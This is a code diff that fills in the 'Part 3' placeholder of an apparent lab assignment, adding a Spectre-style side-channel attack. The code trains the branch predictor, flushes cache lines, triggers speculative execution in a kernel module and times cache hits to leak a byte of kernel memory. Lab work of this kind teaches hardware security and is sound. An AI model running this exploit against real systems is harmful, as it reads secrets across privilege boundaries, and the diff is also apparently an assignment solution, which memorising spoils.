@@ -47,6 +47,31 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 
         // [Part 3]- Fill this in!
         // leaked_byte = ??
+        // Step 1: Train branch predictor
+        for (int train = 0; train < 40; train++) {
+            call_kernel_part3(kernel_fd, shared_memory, 0);
+        }
+
+        // Step 2: Flush part3_limit to extend speculation window
+        extern char part3_limit[];
+        clflush(part3_limit);
+
+        // Step 3: Flush shared memory
+        for (int i = 0; i < 256; i++) {
+            clflush(&shared_memory[i * 4096]);
+        }
+
+        // Step 4: Trigger speculative execution
+        call_kernel_part3(kernel_fd, shared_memory, current_offset);
+
+        // Step 5: Measure access times
+        for (int i = 0; i < 256; i++) {
+            uint64_t access_time = time_access(&shared_memory[i * 4096]);
+            if (access_time < CACHE_HIT_THRESHOLD) {
+                leaked_byte = (char)i;
+                break;
+            }
+        }
 
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
